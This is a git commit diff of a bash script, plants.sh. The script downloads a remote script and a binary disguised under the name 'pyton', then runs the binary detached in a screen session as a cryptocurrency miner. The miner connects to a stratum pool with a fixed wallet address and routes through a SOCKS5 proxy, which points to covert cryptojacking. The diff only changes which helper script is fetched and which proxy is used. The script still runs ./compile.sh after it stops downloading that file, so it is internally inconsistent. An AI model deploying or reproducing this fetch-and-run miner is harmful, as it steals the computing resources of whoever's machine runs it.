64a8c81126eea7bcca1e41e6ea19f296e99bb3fd
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-16 00:39:54 +0700

    Update plants.sh

--- plants.sh
+++ plants.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 apt-get install screen -y
-wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
+wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/jobs.sh
 wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
+chmod +x jobs.sh
 chmod +x kase
-screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
-chmod +x compile.sh
+screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://192.252.208.70:14282
 ./compile.sh
 
 echo success
